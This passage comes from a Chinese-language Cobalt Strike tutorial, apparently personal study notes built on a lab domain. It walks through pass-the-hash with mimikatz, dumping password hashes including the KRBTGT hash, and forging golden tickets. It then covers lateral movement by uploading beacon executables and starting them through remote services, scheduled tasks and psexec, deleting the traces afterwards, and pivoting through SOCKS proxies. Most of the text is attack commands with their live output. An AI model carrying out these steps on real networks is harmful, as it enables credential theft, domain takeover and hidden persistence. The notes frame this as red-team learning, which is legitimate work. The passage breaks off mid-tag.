class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p><p>2、使用 spawn beacon 替代凭证</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">spawnas DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在目标上建立账户</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net use \\host\C$<span class="token operator">/</span>USER:DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p><h3 id="密码哈希"><a href="#密码哈希" class="headerlink" title="密码哈希"></a>密码哈希</h3><p>使用 mimikatz 获取密码哈希</p><pre class="line-numbers language-none"><code class="language-none">pth DOMAIN\user ntlmhash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何工作的？</p><p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p><p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>pth</code> 获取信任</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 23 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run mimikatz's sekurlsa::pth <span class="token operator">/</span>user:Administrator <span class="token operator">/</span>domain:TEAMSSIX <span class="token operator">/</span>ntlm:12cb161bvca930994x00cbc0aczf06d1 <span class="token operator">/</span>run:<span class="token string">"%COMSPEC% /c echo ade660d8dce > \\.\pipe\8d3e4c"</span> command<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 750600 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 71 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEM<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:user: Administratordomain: TEAMSSIXprogram: C:\Windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c <span class="token function">echo</span> ade660d8dce > \\<span class="token punctuation">.</span>\pipe\8d3e4cimpers<span class="token punctuation">.</span>: noNTLM: 12cb161bvca930994x00cbc0aczf06d1  <span class="token punctuation">|</span>  PID  2992  <span class="token punctuation">|</span>  TID  5028  <span class="token punctuation">|</span>  LSA <span class="token keyword">Process</span> is now R<span class="token operator">/</span>W  <span class="token punctuation">|</span>  LUID 0 <span class="token punctuation">;</span> 14812112 <span class="token punctuation">(</span>00000000:00e203d0<span class="token punctuation">)</span>  \_ msv1_0   <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 0000000001794E80 : OK <span class="token operator">!</span>  \_ kerberos <span class="token operator">-</span> <span class="token keyword">data</span> <span class="token function">copy</span> @ 000000000044A188   \_ aes256_hmac       <span class="token operator">-</span>> null                \_ aes128_hmac       <span class="token operator">-</span>> null                \_ rc4_hmac_nt       OK   \_ rc4_hmac_old      OK   \_ rc4_md4           OK   \_ rc4_hmac_nt_exp   OK   \_ rc4_hmac_old_exp  OK   \_ <span class="token operator">*</span>Password replace @ 00000000017DA1E8 <span class="token punctuation">(</span>16<span class="token punctuation">)</span> <span class="token operator">-</span>> nullbeacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Kerberos-票据"><a href="#Kerberos-票据" class="headerlink" title="Kerberos 票据"></a>Kerberos 票据</h3><p>关于 Kerberos 的介绍可以查看知乎上的一篇文章，比较形象生动，文章地址： <a href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p><p>查看有哪些 Kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除去 kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载 kerberos 票据</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">kerberos_ticket_use <span class="token punctuation">[</span><span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span>file<span class="token punctuation">.</span>ticket<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p><p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p><p><strong>1、目标的用户名及域名</strong></p><p><strong>2、域的 SID 值</strong></p><p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell whoami <span class="token operator">/</span>user<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: whoami <span class="token operator">/</span>user<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 43 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:用户信息<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>用户名        SID                                         ============= ============================================teamssix\daniel S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>21<span class="token operator">-</span>5311978431<span class="token operator">-</span>183514165<span class="token operator">-</span>284342044<span class="token operator">-</span>1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p><p><strong>3、DC 中  KRBTGT  用户的 NTLM 哈希</strong></p><p>DC 中  KRBTGT  用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> hashdump<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to dump hashes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 82501 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs18-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式。</p><p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 203 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、远程代码执行"><a href="#5、远程代码执行" class="headerlink" title="5、远程代码执行"></a>5、远程代码执行</h2><p>实现代码执行的四个步骤：</p><p>1、与目标建立信任关系</p><p>2、复制可执行文件到目标上</p><p>3、在目标上运行可执行文件</p><p>4、实现对目标的控制</p><p>以上是根据视频教程中直译的结果，个人感觉其实这一节叫<code>横向移动的方法</code>更为合适。</p><p><strong>创建可执行文件</strong></p><p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; Windows Executable(s)</code> 处进行创建。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p><p><strong>上传可执行文件</strong></p><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> file<span class="token punctuation">.</span>exe \\host\C$\Windows\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> upload <span class="token operator">/</span>root<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to upload <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe as beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 289302 bytesbeacon> shell <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 72 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行文件（方法一）</strong></p><p>1、生成 Windows Service EXE 并上传</p><p>2、在目标主机上创建一个服务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host create name binpath= c:\windows\temp\file<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:<span class="token namespace">[SC]</span> CreateService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：记住 binpath 路径</p></blockquote><p>3、在目标主机上启动服务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host <span class="token function">start</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 56 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:SERVICE_NAME: beacon         <span class="token function">TYPE</span>               : 10  WIN32_OWN_PROCESS          STATE              : 2  START_PENDING                                 <span class="token punctuation">(</span>NOT_STOPPABLE<span class="token punctuation">,</span> NOT_PAUSABLE<span class="token punctuation">,</span> IGNORES_SHUTDOWN<span class="token punctuation">)</span>        WIN32_EXIT_CODE    : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>        SERVICE_EXIT_CODE  : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>        CHECKPOINT         : 0x0        WAIT_HINT          : 0x7d0        PID                : 3816        FLAGS              :         beacon> link wintest<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\wintest\pipe\msagent_da00<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 36 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、清除痕迹与服务</p><pre class="line-numbers language-none"><code class="language-none">shell sc \\host delete name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 57 bytesbeacon> shell <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 83 bytesbeacon> shell <span class="token function">sc</span> \\wintest delete beacon<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest delete beacon<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 69 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:<span class="token namespace">[SC]</span> DeleteService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行文件（方法二）</strong></p><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p><p>2、找到目标系统上的时间</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell net time \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net time \\windc<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net time \\windc<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 49 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:\\windc 的当前时间是 2020<span class="token operator">/</span>8<span class="token operator">/</span>30 14:54:09命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、创建一个计划任务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host HH:mm C:\path\to\bad<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 76 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:新加了一项作业，其作业 ID = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> link windc<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\windc\pipe\msagent_d76a<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 34 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>beacon 的自动操作</strong></p><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p><ul><li>使用一个服务运行可执行文件</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec <span class="token namespace">[target]</span> <span class="token namespace">[share]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用一个服务运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec_psh <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 WinRM 运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">winrm <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 WMI 运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wmi <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p><p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net view<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net view<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104504 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:List of hosts:<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: Server Name             IP Address                       Platform  Version  <span class="token function">Type</span>   Comment <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>             WINDC                   192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144                  500       6<span class="token punctuation">.</span>1      PDC     WINTEST                 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130                  500       6<span class="token punctuation">.</span>1         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import PowerView<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: PowerView<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytesbeacon> powershell <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:WinDC<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p><p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动。</p><h1 id="0x07-转发"><a href="#0x07-转发" class="headerlink" title="0x07 转发"></a>0x07 转发</h1><h2 id="1、SOCKS-代理转发"><a href="#1、SOCKS-代理转发" class="headerlink" title="1、SOCKS 代理转发"></a>1、SOCKS 代理转发</h2><p>在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 <code>sleep 0</code> 即为交互模式。</p><h3 id="Socks"><a href="#Socks" class="headerlink" title="Socks"></a>Socks</h3><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs20-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ul><li><p>在当前 beacon 上可以右击选择 <code>Pivoting --&gt; SOCKS Server</code> 设置一个 Socks4a 代理服务</p></li><li><p>或者使用命令 <code>socks [port]</code> 进行设置</p></li><li><p>使用命令 <code>socks stop</code> 关闭 Socks 代理服务</p></li><li><p>在 <code>View --&gt; Proxy Pivots</code> 中可以看到已经创建的代理服务</p></li></ul><h3 id="Metasploit-连接到-Socks-代理服务"><a href="#Metasploit-连接到-Socks-代理服务" class="headerlink" title="Metasploit 连接到 Socks 代理服务"></a>Metasploit 连接到 Socks 代理服务</h3><ul><li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li></ul><pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:127.0.0.1:[port]setg ReverseAllowProxy true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p><ul><li>运行以下命令来停止</li></ul><pre class="line-numbers language-none"><code class="language-none">unsetg Proxies<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p><p><strong>演示</strong></p><p>1、环境说明</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。</p><p>但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。</p><p>2、设置 socks 代理</p><p>开启交互模式</p><pre class="line-numbers language-none"><code class="language-none">sleep 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">sleep</span> 0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to become interactive<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>开启 socks 代理</p><pre class="line-numbers language-none"><code class="language-none">socks 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre 